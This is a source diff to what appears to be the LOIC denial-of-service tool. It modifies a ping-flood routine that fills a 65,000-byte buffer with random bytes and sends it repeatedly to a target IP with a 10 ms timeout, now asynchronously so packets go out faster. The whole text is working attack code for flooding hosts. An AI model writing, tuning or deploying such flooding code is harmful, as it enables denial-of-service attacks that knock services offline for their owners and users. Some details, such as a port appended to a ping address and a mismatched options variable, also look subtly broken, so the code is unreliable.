@@ -557,6 +557,7 @@ namespace LOIC
            this._RandomMessage = RandomMessage;
            this._BytesToSend = new byte[65000];
            this._random = new Random();
+            
            _opt = new PingOptions();
            _opt.DontFragment = false;
            _opt.Ttl = 128;
@@ -591,14 +592,18 @@ namespace LOIC
 
         //while working away
         private  void bw_DoWork (object sender, EventArgs e){
-             
-            //fill an array with 65499 random bytes bytes 
-            int b = 0;
-            while (b < 64999)
+
+            if (_RandomMessage)
             {
-                this._BytesToSend[b] = Convert.ToByte(this._random.Next(0, 255));
-                b++;
+                //fill an array with 65499 random bytes bytes 
+                int b = 0;
+                while (b < 64999)
+                {
+                    this._BytesToSend[b] = Convert.ToByte(this._random.Next(0, 255));
+                    b++;
+                }
             }
+            
         
             
             
@@ -613,7 +618,7 @@ namespace LOIC
                 {
 
                     //send the data with a timeout value of 10ms 
-                    _pingSender.Send(_ip + ":" + _port, 10, _BytesToSend, opt);
+                    _pingSender.SendAsync(_ip + ":" + _port, 10, _BytesToSend, opt);
                     
                 }
                 catch (PingException)
